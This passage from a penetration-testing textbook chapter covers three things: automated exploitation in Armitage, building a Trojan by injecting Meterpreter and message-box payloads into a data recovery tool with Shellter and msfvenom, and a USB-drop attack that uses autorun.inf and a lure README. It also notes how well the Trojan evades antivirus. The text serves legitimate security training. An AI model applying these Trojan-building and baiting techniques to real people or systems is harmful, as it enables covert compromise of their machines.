    you can navigate to **Armitage** | **Set Target View** and select **Table View** to
    change it.
  prefs: []
  type: TYPE_NORMAL
- en: Exploitation made ridiculously simple with Armitage
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: Now comes the part where Armitage can save you a lot of time in the long run
    – understanding the attack surface and preparing potential attacks. Although you
    may be used to a more manual process, this time, we will select **Attacks** in
    the menu bar along the top and click on **Find Attacks**. You’ll see the progress
    bar for a brief period, and then a message wishing you well on your hunt. That’s
    it. So, what happened? Well, Armitage took the hosts and services enumeration
    data and automatically scanned the entire exploit module tree for matches. Right-click
    on a host and select **Attack**. For each service that’s detected with a match,
    there’s another dropdown naming the exploit that could potentially work. We say
    potentially as this is a very rough matching of service data and exploit options,
    and your homework isn’t done. You may enjoy clicking on random exploits to see
    what happens in your lab, but in the real world, you’re just making noise for
    no good reason.
  prefs: []
  type: TYPE_NORMAL
- en: 'One way to check for the applicability of an exploit is to use the appropriately
    named **check** command by performing the following steps:'
  prefs: []
  type: TYPE_NORMAL
- en: In **msfconsole**, we can kick off this command from the prompt within a loaded
    module; in Armitage, we can accomplish the same feat by going to that same dropdown
    listing the exploits found, heading to the bottom of the list, and selecting exploits.
    Watch the **Tab** window come to life as each module is loaded automatically,
    and the **check** command is issued. Remember that an individual module has to
    support the **check** command, as not all do.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'When you select an exploit from the list, the window that pops up is the same
    one you see when you load any exploit from the **Modules** window. The only difference
    is that the options are configured automatically to suit your target, as shown
    in the following screenshot:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![Figure 7.8 – Browsing our procured attacks ](image/Figure_7.8_B17616.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Figure 7.8 – Browsing our procured attacks
  prefs: []
  type: TYPE_NORMAL
- en: Click **Launch** to fire off the attack as a background job so that you can
    keep working while waiting for that connection to come back (if that’s how you
    configured it).
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Remember, Armitage likes to make things look Hollywood, so if your target is
    compromised, the icon changes to a very ominous lightning bolt.
  prefs: []
  type: TYPE_NORMAL
- en: 'Right-click on the target again and you’ll see that a new option is now available
    – **Shell**. You can interact with it and move on from the foothold, as shown
    here:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![Figure 7.9 – Compromised Linux host ](image/Figure_7.9_B17616.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Figure 7.9 – Compromised Linux host
  prefs: []
  type: TYPE_NORMAL
- en: All of this automation is fantastic for professionals in the field, but we should
    be careful not to lose touch with the hacker’s way of thinking, which makes this
    all possible.
  prefs: []
  type: TYPE_NORMAL
- en: A word about Armitage and the pen tester mentality
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: Every time I go for a drive, I notice an extremely common feature in newer cars
    – the blind spot warning light on the side mirror. It lights up to warn the driver
    that a vehicle is in its blind spot. Overall, I’m a supporter of advancing technology
    to make our lives a little easier, and I’m sure this feature is useful. However,
    I worry that some drivers may stop being vigilant if they come to rely on this
    kind of technology. I wonder if drivers have stopped turning their heads to check
    their blind spots.
  prefs: []
  type: TYPE_NORMAL
- en: The issue of blind spots is relevant to Armitage and pen testing because it’s
    sort of like a new technology that drives the car for us, without us having to
    know a single thing about driving. Metasploit was already a revolutionary way
    to automate security testing, and Armitage automates it even further. Long before
    Metasploit existed, even in the 1990s, most of the tasks we take for granted today
    were accomplished manually. When tools were at our disposal, we had to manually
    correlate outputs to develop the understanding that’s necessary for any attack,
    and this was years after the true pioneers developed everything we needed to know.
    Most modern tools allow us to get far more work done in very rigid time frames,
    allowing us to focus on analysis so that we can bring value to the client. There
    is, however, the rise of the script kiddie to contend with, as well as inexperienced
    but passionate hopefuls who download Kali Linux and fire offensive weapons with
    reckless abandon. Despite some complaints, these tools do have a place, so long
    as they are used to improve our lives without replacing basic common sense.
  prefs: []
  type: TYPE_NORMAL
- en: With that in mind, it’s recommended that you find out what’s going on behind
    the scenes. Review the code, analyze the packets on the network, research not
    only the details of the attack and exploit but also the design intent of the affected
    technology, read the RFCs, and try to accomplish a task without the tool – or,
    better yet, write a better tool. This is a fantastic opportunity to better yourself.
  prefs: []
  type: TYPE_NORMAL
- en: Moving forward, we’re going to facilitate a social engineering attack with a
    malicious USB drive. Once the drive has been plugged into a Windows machine, we
    will have a Meterpreter session and be able to take control.
  prefs: []
  type: TYPE_NORMAL
- en: Social engineering attacks with Metasploit payloads
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: Let’s wrap this chapter up by bringing together two topics – backdoor injection
    into a legitimate executable and using Metasploit as the payload generator and
    handler. We’re going to use Shellter and nested Meterpreter payloads to create
    a malicious AutoRun USB drive. Although AutoRun isn’t often enabled by default,
    you may find it enabled in certain corporate environments. Even if AutoRun doesn’t
    execute automatically, we’re going to work with an executable that may encourage
    the user to execute it by creating the impression that there’s deleted data on
    the drive that can be recovered.
  prefs: []
  type: TYPE_NORMAL
- en: Creating a Trojan with Shellter
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: 'Follow these steps to create a Trojan with Shellter:'
  prefs: []
  type: TYPE_NORMAL
- en: The first and the most tedious step is finding a suitable executable. This is
    tricky because Shellter has certain limitations – the executables have to be 32-bit,
    they can’t be packed executables, and they need to play nice with our payloads.
    We won’t know an executable works until we bother to infect a file and try running
    it. After digging around for a suitable executable, we found a 400-something-kilobyte
    data recovery tool called **DataRecovery.exe**. This requires no installation
    and has no dependencies.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'After confirming that the recovery tool is 32-bit and clean, put it in your
    root folder to work on later. First, we want to create a nested payload with **msfvenom**.
    We don’t need to do this part, but we’re trying to give the attack a little pizzazz.
    Do this with the following command line:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: msfvenom --arch x86 --platform windows --payload windows/messagebox ICON=WARNING
    TITLE="Data Restore" TEXT="Recoverable deleted files detected." --format raw >
    message
  prefs:
  - PREF_IND
  - PREF_H1
  type: TYPE_NORMAL
- en: 'We should now have two files in the root folder: the executable and a 268-byte
    binary file called **message**. Now, fire up Shellter in Stealth Mode by passing
    **Y** to the prompt. This requires the same process we talked about earlier in
    this chapter until we need to specify our custom payload, as shown in the following
    screenshot:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![Figure 7.10 – Specifying the custom payload ](image/Figure_7.10_B17616.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Figure 7.10 – Specifying the custom payload
  prefs: []
  type: TYPE_NORMAL
- en: Now, Shellter is going to spit out **DataRecovery.exe**; a quick **sha1sum**
    command will soon confirm that the binary has been modified. At this point, we
    have a legitimate data recovery tool that displays a message box. Now, it’s time
    to make it work for us.
  prefs: []
  type: TYPE_NORMAL
- en: 'Now that we have the nested payload, we will simply send the new binary through
    Shellter one more time. This time, however, we must select the number 1 stager
    on the list of included payloads – the reverse TCP Meterpreter payload. Now, we
    have a complete Trojan that’s ready to rock. The program is a legitimate data
    recovery utility that pops up an advisory, warning users that deleted data has
    been detected. Meanwhile, the Meterpreter payload has phoned home to our handler
    and given us control, as shown in the following screenshot:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![Figure 7.11 – The Trojan after injecting the message box payload, ready for
    the connect-back code ](image/Figure_7.11_B17616.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Figure 7.11 – The Trojan after injecting the message box payload, ready for
    the connect-back code
  prefs: []
  type: TYPE_NORMAL
- en: Note
  prefs: []
  type: TYPE_NORMAL
- en: When you configure your handler, always set **EXITFUNC** as a thread. If you
    don’t, the Meterpreter session will die when the Trojan does!
  prefs: []
  type: TYPE_NORMAL
- en: 'By the way, we improved our evasion with this one – now, we’re undetected by
    75% of antivirus vendors, as shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 7.12 – Improving our stealth by tweaking our strategy ](image/Figure_7.12_B17616.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Figure 7.12 – Improving our stealth by tweaking our strategy
  prefs: []
  type: TYPE_NORMAL
- en: This is a notable example of how much fine-tuning plays a role in the art of
    AV evasion. What happened with this executable that made it look a little better
    than the last? Was it the double pass through Shellter, or the use of a custom
    innocuous payload? There are many moving parts to antivirus detection, so it’s
    hard to say, but keep in mind that you will probably need to play around in the
    lab before you deploy one of your creations. In my experience, it usually took
    trying a few different tricks before I got around a target’s defense.
  prefs: []
  type: TYPE_NORMAL
- en: Preparing a malicious USB drive for Trojan delivery
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: 'There are just two steps left – one is technical (though very simple), while
    the other is purely for social engineering purposes. Let’s start with the technical
    step, which is creating the **autorun** file:'
  prefs: []
  type: TYPE_NORMAL
- en: 'This is as simple as creating a text file called **autorun.inf** that points
    to our executable. It must start with the line **[autorun]**, with the file that
    is to be opened identified by **open=**. Microsoft defines other AutoRun commands,
    but **open=** is the only one we need. You can also add the **icon=** command,
    which will make the drive appear as the executable’s icon (or any other icon you
    define), as shown here:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![Figure 7.13 – Typing up the AutoRun file ](image/Figure_7.13_B17616.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Figure 7.13 – Typing up the AutoRun file
  prefs: []
  type: TYPE_NORMAL
- en: 'Now, it’s time for the social engineering part. What if AutoRun doesn’t work?
    After all, it is disabled on a lot of systems these days. Remember that if someone
    went so far as to plug in our drive, they’ll see the files. To hint that running
    **DataRecovery.exe** is worth the risk, we will add an enticing **README** file.
    The file will make it look like deleted files are available for recovery. Curiosity
    gets the best of a lot of people. Take a look at the following screenshot:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![Figure 7.14 – Typing up our psychological README ](image/Figure_7.14_B17616.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Figure 7.14 – Typing up our psychological README
  prefs: []
  type: TYPE_NORMAL
- en: You may know better than to fall for this, but imagine scattering 100 USB drives
    throughout the public areas of your client. Don’t you think you’d get a hit? You
    only need it to work once – a valuable lesson for your clients.
  prefs: []
  type: TYPE_NORMAL
- en: Summary
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In this chapter, we learned about more advanced Metasploit usage. We took our
    payload generation skills to the next level by leveraging a tool outside of the
    Metasploit Framework, Shellter, to leverage Metasploit payloads. We also explored
    the capabilities of **msfvenom**, today’s union of what used to be Metasploit’s
    payload and encoder tools. After payloads, we looked at how to build a custom
    module with Ruby and how to get it working within Metasploit. We then examined
    making Metasploit use highly organized and efficient with the Armitage frontend
    GUI. We also demonstrated how to enumerate and exploit a target in Armitage. Finally,
    we learned how to leverage Metasploit payloads to construct powerful social engineering
    attacks. In the true hacking spirit, the next chapter is going to take us deeper
    into how the processor sees our tidbits of code.
  prefs: []
  type: TYPE_NORMAL
- en: Questions
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'Answer the following questions to test your knowledge of this chapter:'
  prefs: []
  type: TYPE_NORMAL
- en: What are the three types of payload?
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: __________ is a common example of a hex byte that can break the execution of
    our payload.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Which **msfvenom** flag should be used to specify that the payload is to run
    on an x86 instruction set architecture?
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: In Ruby, **def** defines a _______.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: What’s the difference between **print_good()** and **print_status()**?
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: There is only one target view in Armitage. (True | False)
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: When you’re sending Shellter Stealth Mode payloads, _________ should always
    be set to ________ when you’re configuring options for **windows/meterpreter/reverse_tcp**.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: All modern Windows hosts enable AutoRun by default. (True | False)
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Further reading
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'For more information regarding the topics that were covered in this chapter,
    take a look at the following resources:'
  prefs: []
  type: TYPE_NORMAL
- en: 'The Shellter project home page: [https://www.shellterproject.com/](https://www.shellterproject.com/)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: 'Documentation on running Windows applications with Wine32: [https://www.winehq.org/documentation](https://www.winehq.org/documentation)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: 'The Metasploit Framework on GitHub: [https://github.com/rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
